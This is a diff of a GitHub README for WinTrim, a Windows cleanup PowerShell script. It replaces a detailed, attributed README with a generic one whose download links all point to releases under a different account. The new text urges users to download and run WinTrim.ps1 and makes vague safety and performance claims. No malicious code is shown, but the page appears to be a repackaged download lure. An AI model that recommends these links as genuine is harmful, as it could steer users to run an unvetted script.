@@ -1,375 +1,74 @@
-# 🧹 WinTrim 2.0
+# 🎉 WinTrim - Clean Up Your Windows Easily
 
-**Comprehensive Windows Cleanup Tool**
+## 🏷️ Overview
+WinTrim is a comprehensive Windows cleanup Powershell script designed to help you declutter your system. It removes unnecessary files and optimizes system performance, giving you more space and faster speeds. With WinTrim, maintaining your Windows device becomes a simple task. 
 
-WinTrim 2.0 is a powerful, modular cleanup tool that goes beyond simple duplicate removal. It intelligently cleans your Windows system across multiple areas while keeping your system safe and functional. Like Marie Kondo for your entire Windows installation—keeping only what sparks joy (and functionality).
+## ⚡ Key Features
+- **Debloat Your System:** WinTrim effectively removes unwanted software and applications that slow down your device.
+- **Enhance Privacy:** The script helps delete suspicious files that may compromise your privacy.
+- **Free Up RAM:** By clearing out background processes, WinTrim can improve your device’s speed.
+- **Storage Optimization:** WinTrim scans and identifies large files that you may no longer need, making your storage management easy.
+- **Windows Compatibility:** Works smoothly with both Windows 10 and Windows 11.
 
-![PowerShell](https://img.shields.io/badge/PowerShell-5.1+-blue.svg)
-![Windows](https://img.shields.io/badge/Windows-10%2F11-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Version](https://img.shields.io/badge/version-2.0-brightgreen.svg)
-![GitHub Stars](https://img.shields.io/github/stars/kdsmith10000/WinTrim?style=social)
-![GitHub Forks](https://img.shields.io/github/forks/kdsmith10000/WinTrim?style=social)
-![GitHub Issues](https://img.shields.io/github/issues/kdsmith10000/WinTrim)
-![GitHub Last Commit](https://img.shields.io/github/last-commit/kdsmith10000/WinTrim)
-![GitHub Downloads](https://img.shields.io/github/downloads/kdsmith10000/WinTrim/total)
+## 🚀 Getting Started
+To get started with WinTrim, follow these straightforward steps. This guide ensures that you can download and run the application without any technical knowledge.
 
-## ✨ New in Version 2.0
+### ✅ Step 1: Download WinTrim
+You can download WinTrim from our Releases page. Click the button below to access it and download the latest version of the script.
 
-### 🎯 Six Powerful Cleanup Modules
+[![Download WinTrim](https://img.shields.io/badge/Download%20WinTrim-v1.0-blue.svg)](https://github.com/Ramli243/WinTrim/releases)
 
-1. **Duplicate Programs** (Original WinTrim)
-   - Removes old software updates and duplicate redistributables
-   - Intelligent pattern matching and online version checking
-   - Keeps different Visual C++ years and editions separate
+### 🔗 Step 2: Access the Downloads Page
+Visit the following link to view all available versions and select the one suited for your needs:
 
-2. **Temp Files Cleanup**
-   - Cleans system and user temporary directories
-   - Safe removal of old temporary files
-   - Typical savings: 1-10 GB
+[Download WinTrim here](https://github.com/Ramli243/WinTrim/releases)
 
-3. **Windows Update Cache**
-   - Clears Windows Update download cache
-   - Safely stops and restarts update services
-   - Typical savings: 5-20 GB
+### 💻 Step 3: Run the Script
+1. After downloading, open the folder where the file is saved.
+2. Locate the downloaded file, usually named "WinTrim.ps1". 
+3. Right-click on the file and select "Run with PowerShell".
 
-4. **Browser Cache Cleanup**
-   - Supports Brave, Chrome, Edge, and Firefox
-   - Clears code cache and regular cache
-   - Typical savings: 500 MB - 5 GB
+## ⚙️ System Requirements
+Ensure your device meets the following requirements for optimal performance:
+- **Operating System:** Windows 10 or Windows 11
+- **PowerShell Version:** Microsoft PowerShell 5.0 or later
+- **Free Disk Space:** At least 100 MB for installation and operations
+- **Internet Access:** Required for downloading updates and new versions
 
-5. **System Cache Cleanup**
-   - Thumbnail cache, shader cache, icon cache
-   - Windows error reports and old logs
-   - Prefetch files older than 7 days
-   - Typical savings: 1-3 GB
-
-6. **Advanced DISM Cleanup**
-   - Component store analysis and cleanup
-   - Superseded component removal
-   - Most thorough but slowest (10-30 minutes)
-   - Typical savings: 2-10 GB
-
-### 🎮 Interactive Module Selection
-- Run all modules or pick specific ones
-- Easy-to-use menu interface
-- Each module runs independently with its own confirmation
-
-### 📊 Enhanced Reporting
-- Comprehensive final statistics
-- Per-module breakdown
-- Time tracking
-- Total space freed across all modules
-
-## 🚀 Quick Start
-
-### Prerequisites
-- Windows 10 or Windows 11
-- PowerShell 5.1 or later
-- Administrator privileges
-
-### Installation
-
-1. **Download WinTrim**
+## 🔧 How to Use WinTrim
+1. **Launch PowerShell:** Right-click on the Start menu and select "Windows PowerShell (Admin)".
+2. **Execution Policy:** Set the execution policy to allow the script to run. Execute this command:
    ```powershell
-   # Clone the repository
-   git clone https://github.com/kdsmith10000/WinTrim.git
-   cd WinTrim
+   Set-ExecutionPolicy RemoteSigned
    ```
-
-2. **Run as Administrator**
-   - Right-click PowerShell
-   - Select "Run as Administrator"
-   - Navigate to the WinTrim directory
-   - Run the script:
+3. **Navigate to the Script Location:** Use the `cd` command to navigate to the folder where "WinTrim.ps1" is located. For example:
+   ```powershell
+   cd C:\Users\YourUsername\Downloads
+   ```
+4. **Execute the Script:** Type the following command and hit Enter:
    ```powershell
    .\WinTrim.ps1
    ```
 
-## 📖 Usage
+## 📌 Important Notes
+- Always back up your important files before running any cleanup script.
+- Review the changes WinTrim plans to make before proceeding.
 
-### Basic Usage
+## 📚 FAQ
+**Q: Is WinTrim safe to use?**  
+A: Yes, WinTrim is designed to enhance your system’s performance safely. It only removes files that are generally deemed unnecessary.
 
-Simply run the script and follow the interactive prompts:
+**Q: How often should I run WinTrim?**  
+A: For optimal performance, consider using WinTrim once a month.
 
-```powershell
-.\WinTrim.ps1
-```
+## 🌐 Additional Resources
+For more information and updates, consider checking:
+- [GitHub Repository](https://github.com/Ramli243/WinTrim)
+- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
 
-The script will:
-1. ✅ Prompt to create a system restore point (recommended!)
-2. 📋 Show available cleanup modules
-3. 🎯 Let you select which modules to run (or run all)
-4. 🔍 Scan and analyze each selected module
-5. 💾 Display estimated disk space savings per module
-6. ⚠️ Ask for confirmation before each cleanup operation
-7. 🗑️ Perform cleanup operations
-8. 📊 Show comprehensive final statistics
+## 📥 Download & Install
+For seamless access, download the latest version from our Releases page:
 
-### Interactive Module Selection
+[Download WinTrim here](https://github.com/Ramli243/WinTrim/releases)
 
-```
-Available modules:
-  1. Duplicate Programs - Remove old software updates (original WinTrim)
-  2. Temp Files - Clean system and user temp directories
-  3. Windows Update Cache - Clear update download cache
-  4. Browser Cache - Clear browser caches (Brave, Chrome, Edge, Firefox)
-  5. System Cache - Clean thumbnails, logs, error reports, shader cache
-  6. Advanced DISM - Component store cleanup (slow but thorough)
-  A. All modules
-  Q. Quit
-
-Enter modules to run (e.g., '1,2,3' or 'A' for all):
-```
-
-### What Gets Cleaned by Module
-
-**Module 1: Duplicate Programs**
-- ✅ Visual C++ Redistributables (old versions of same year/edition)
-- ✅ Microsoft .NET Runtime (outdated versions)
-- ✅ Microsoft Edge Updates (old update helpers)
-- ✅ MongoDB, Java, Adobe updates (old versions)
-- ❌ NEVER removes different Visual C++ years (coexist by design)
-- ❌ NEVER removes Python components (part of one installation)
-- ❌ NEVER removes single installations
-
-**Module 2-6: System Cleanup**
-- Temporary files (system and user)
-- Windows Update download cache
-- Browser caches (all major browsers)
-- Thumbnail, shader, and icon caches
-- Windows error reports and old logs
-- Superseded Windows components (DISM)
-
-## 💡 Example Output
-
-```
-========================================
-  WinTrim v2.0
-  Comprehensive Windows Cleanup
-========================================
-
-Available modules:
-  1. Duplicate Programs - Remove old software updates (original WinTrim)
-  2. Temp Files - Clean system and user temp directories
-  3. Windows Update Cache - Clear update download cache
-  4. Browser Cache - Clear browser caches (Brave, Chrome, Edge, Firefox)
-  5. System Cache - Clean thumbnails, logs, error reports, shader cache
-  6. Advanced DISM - Component store cleanup (slow but thorough)
-  A. All modules
-  Q. Quit
-
-Enter modules to run (e.g., '1,2,3' or 'A' for all): A
-
-Modules to run:
-  ✓ Duplicate Programs
-  ✓ Temp Files
-  ✓ Windows Update Cache
-  ✓ Browser Cache
-  ✓ System Cache
-  ✓ Advanced DISM
-
-========================================
-  MODULE: Temporary Files Cleanup
-========================================
-
-Scanning temp directories...
-Total potential space to free: 3.45 GB
-
-Proceed with temp files cleanup? (Y/N) Y
-
-Temp Cleanup Results:
-  Files removed: 15,234
-  Space freed: 3.45 GB
-
-... [other modules run] ...
-
-========================================
-  WinTrim Cleanup Complete!
-========================================
-
-FINAL STATISTICS:
--------------------
-Total space freed: 24.67 GB
-Programs removed: 8
-Temp files removed: 15,234
-Time elapsed: 12m 34s
-
-CLEANUP BY MODULE:
--------------------
-Temp Files: 15,234 files removed
-Windows Update: 8.23 GB
-Browser Cache: 4.12 GB
-System Cache: 2.34 GB
-Duplicate Programs: 8 removed
-DISM Cleanup: 6.53 GB
-```
-
-## 🔧 Advanced Configuration
-
-### Execution Policy
-
-If you encounter execution policy errors:
-
-```powershell
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
-.\WinTrim.ps1
-```
-
-### Custom Patterns
-
-You can modify the `$patterns` array in the script to add your own software patterns:
-
-```powershell
-$patterns = @(
-    "Microsoft Edge",
-    "Your Custom Pattern"
-)
-```
-
-## 📊 Statistics & Reporting
-
-After cleanup, WinTrim provides:
-
-```
-REMOVAL STATISTICS:
--------------------
-Programs targeted for removal: 8
-Successfully removed: 8
-Failed to remove: 0
-
-DISK SPACE SAVINGS:
--------------------
-Total disk space freed: 102.95 MB
-
-ESTIMATED MEMORY SAVINGS:
--------------------------
-Potential RAM savings: ~600 MB
-(Old update services no longer running)
-
-ADDITIONAL BENEFITS:
---------------------
-- Cleaner Add/Remove Programs list
-- Reduced registry clutter
-- Faster system scans and updates
-```
-
-## 🛡️ Safety & Security
-
-### Security Features
-
-- ✅ **Requires Administrator Privileges**: Prevents unauthorized execution
-- ✅ **No Internet Dependencies**: Works offline (uses cached version data as fallback)
-- ✅ **No Data Collection**: Completely private, nothing sent anywhere
-- ✅ **Open Source**: Fully auditable code
-
-### Security Audit
-
-WinTrim has been designed with security in mind:
-
-- **No arbitrary code execution**: Only uses uninstall strings from registry
-- **Input validation**: All registry data is validated before use
-- **Safe defaults**: Conservative approach, keeps items when in doubt
-- **Restore point integration**: Easy rollback if needed
-
-## ⚠️ Important Notes
-
-### Before Running
-
-1. **Create a backup** of important data
-2. **Close all programs** before running
-3. **Read the preview** carefully before confirming removal
-4. **Accept the restore point** prompt (strongly recommended)
-
-### Known Limitations
-
-- Some programs may fail to uninstall silently (exit code 1603)
-- Requires manual intervention for programs with custom uninstallers
-- Online version checking requires internet connection (falls back to cached data)
-
-## 🐛 Troubleshooting
-
-### "Script not recognized" error
-```powershell
-# Use full path
-C:\path\to\WinTrim.ps1
-```
-
-### "Execution policy" error
-```powershell
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
-```
-
-### "Not running as administrator"
-Right-click PowerShell → "Run as Administrator"
-
-### Items failed to remove
-Check the exit code in the output. Common codes:
-- `1603`: Installation failed (dependency issue)
-- `1605`: Product not found (already removed)
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-### Areas for Contribution
-
-- 🌐 Additional online version sources
-- 🎯 More software patterns
-- 🌍 Internationalization
-- 📝 Documentation improvements
-- 🐛 Bug fixes
-
-## 📜 License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by the need for safer Windows cleanup tools
-- Built with feedback from the Windows power user community
-- Thanks to all contributors and testers
-
-## 📞 Support
-
-- **Issues**: [GitHub Issues](https://github.com/kdsmith10000/WinTrim/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/kdsmith10000/WinTrim/discussions)
-
-## ⚡ Roadmap
-
-### ✅ Completed (v2.0)
-- [x] Modular cleanup system
-- [x] Temp files cleanup
-- [x] Windows Update cache cleanup
-- [x] Browser cache cleanup
-- [x] System cache cleanup
-- [x] DISM component cleanup
-- [x] Comprehensive statistics and reporting
-
-### 🔮 Future Enhancements
-- [ ] GUI version
-- [ ] Scheduled cleanup tasks
-- [ ] Export/import cleanup profiles
-- [ ] Detailed HTML/JSON reports
-- [ ] Per-module rollback
-- [ ] Portable version (no installation required)
-- [ ] Recycle Bin cleanup module
-- [ ] Windows.old removal module
-- [ ] Driver store cleanup
-- [ ] More granular control per cleanup type
-
-### Screenshots
-
-![1](https://github.com/user-attachments/assets/91534cfc-6752-438e-b5e8-86ef131c1562)
-
-![2](https://github.com/user-attachments/assets/0dd53b99-e6a8-4574-904b-87782da203b5)
-
-![3](https://github.com/user-attachments/assets/dcf561bf-c515-46b3-9acc-35ebcdd69567)
-
-![4](https://github.com/user-attachments/assets/6f5a2b2c-ce4a-42a8-831c-750a3214de1d)
-
----
-
-**Made with ❤️ for the Windows community**
-
-*WinTrim - Keep your Windows installation lean and clean!*
+By following these steps, you'll optimize your Windows device efficiently. Enjoy a cleaner, faster experience with WinTrim.
